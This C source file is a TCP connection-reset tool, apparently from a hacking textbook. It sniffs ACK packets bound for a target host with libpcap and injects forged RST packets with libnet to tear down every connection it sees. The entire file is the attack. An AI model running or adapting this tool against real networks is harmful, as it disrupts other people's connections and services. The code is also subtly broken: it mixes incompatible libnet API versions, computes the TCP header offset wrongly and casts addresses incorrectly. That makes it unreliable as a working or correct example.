#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <pcap.h>
#include "../hacking.h"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

struct data_pass{
  libnet_t *libnet_handle;
  u_char *packet;
};

int main(int argc, char *argv[]){
  libnet_t *l;
  struct pcap_pkthdr *cap_header;
  const u_char *packet, *pkt_data;
  pcap_t *pcap_handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  char *device;
  u_int32_t target_ip;
  int network;
  struct data_pass critical_libnet_data;

  if (argc<2){
    printf("Usage: %s \n", argv[0]);
    exit(0);
  }

  l = libnet_init(LIBNET_RAW4, NULL, errbuf);
  if (l == NULL){
    libnet_geterror(errbuf);
  }

  target_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE);

  if (target_ip == -1)
    perror("Invalid target address");

  device = pcap_lookupdev(errbuf);
  if (device == NULL)
    perror(errbuf);

  pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
  if (pcap_handle == NULL)
    perror(errbuf);

  critical_libnet_data.libnet_handle = l;
  critical_libnet_data.packet = NULL;

  libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));
  if (critical_libnet_data.packet == NULL)
    perror("Can't initialize packet memory");

  libnet_seed_prand(l);

  set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

  printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
  pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);

  pcap_close(pcap_handle);
}

int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip){
  struct bpf_program filter;
  char filter_string[100];

  sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));

  printf("DEBUG: filter string is '%s'\n", filter_string);
  if (pcap_compile(pcap_hdl, &filter, filter_string, 0, PCAP_NETMASK_UNKNOWN) == -1)
    perror("pcap_compile failed");

  if (pcap_setfilter(pcap_hdl, &filter) == -1)
    perror("pcap_setfilter failed");
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet){
  u_char *pkt_data;
  struct libnet_ipv4_hdr *IPhdr;
  struct libnet_tcp_hdr *TCPhdr;
  struct data_pass *passed;
  int bcount;

  passed = (struct data_pass *)user_args;

  IPhdr = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);
  TCPhdr = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + LIBNET_TCP_H);

  printf("Resetting TCP connection from %s:%d",
         inet_ntoa(IPhdr->ip_src), ntohs(TCPhdr->th_sport));
  printf("<---> %s:%d\n",
         inet_ntoa(IPhdr->ip_dst), ntohs(TCPhdr->th_dport));
  
  libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, IPTOS_LOWDELAY, libnet_get_prand(LIBNET_PR16), 0, libnet_get_prand(LIBNET_PR8), IPPROTO_TCP, ((u_long )&(IPhdr->ip_dst)), ((u_long )&(IPhdr->ip_src)), NULL, 0, passed->packet);
  
  libnet_build_tcp(ntohs(TCPhdr->th_dport), ntohs(TCPhdr->th_sport), libnet_get_prand(LIBNET_PRu32), TH_RST, libnet_get_prand(LIBNET_PRu16), 0, NULL, 0, passed->packet + LIBNET_IPV4_H);

  if (libnet_do_checksum(passed->libnet_handle, passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
    perror("Can't compute checksum");

  bcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IPV4_H + LIBNET_TCP_H);
  if (bcount < LIBNET_IP_H + LIBNET_TCP_H)
    libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.");

  usleep(5000); // pause slightly
}

